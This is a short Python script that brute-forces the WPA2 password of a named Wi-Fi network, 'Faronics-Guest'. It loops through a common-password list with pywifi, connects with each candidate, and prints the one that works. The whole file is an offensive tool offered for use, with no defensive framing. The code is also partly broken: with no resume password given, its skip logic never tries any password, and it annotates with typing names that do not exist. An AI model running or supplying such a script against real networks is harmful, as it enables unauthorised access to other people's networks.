import time
import typing

import pywifi


def main() -> None:
    '''
    Main execution of this script
    :return: No return
    '''
    crack_wifi("Faronics-Guest")


def crack_wifi(wifi_name: str, continue_from_pass: str = None) -> None:
    '''
    This is where we attempt to determine a wifi password
    :param wifi_name: The name of the wifi network
    :param continue_from_pass: The password to start from if resuming the algorithm
    :return: None, results are logged in print statements
    '''
    wifi: typing.PyWiFi = pywifi.PyWiFi()
    status: int = pywifi.const
    ifaces: typing.Interface = wifi.interfaces()[0]

    ifaces.disconnect()

    profile: typing.Profile = pywifi.Profile()
    profile.ssid: str = wifi_name
    profile.auth: int = pywifi.const.AUTH_ALG_OPEN

    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)

    profile.cipher: int = pywifi.const.CIPHER_TYPE_CCMP

    with open('10-million-password-list-top-100000.txt') as pass_file:
        rows: list[str] = pass_file.readlines()
        passwords: list[str] = [row.strip() for row in rows]

        start_search: str = continue_from_pass
        is_at_start_value: bool = False

        for password in passwords:

            if not is_at_start_value:
                if password == start_search:
                    is_at_start_value = True
                else:
                    continue

            print('Trying password: {}'.format(password))
            profile.key: str = password

            tmp_profile: typing.Profile = ifaces.add_network_profile(profile)

            ifaces.connect(tmp_profile)

            # sleep is needed to query the wireless interfaces but is not performant
            # TODO: find a better solution
            time.sleep(3)
            if ifaces.status() == status.IFACE_CONNECTED:
                print("The wifi password for {} is {}".format(wifi_name, password))
                break

            ifaces.disconnect()

    print('End of search')


if __name__ == '__main__':
    main()
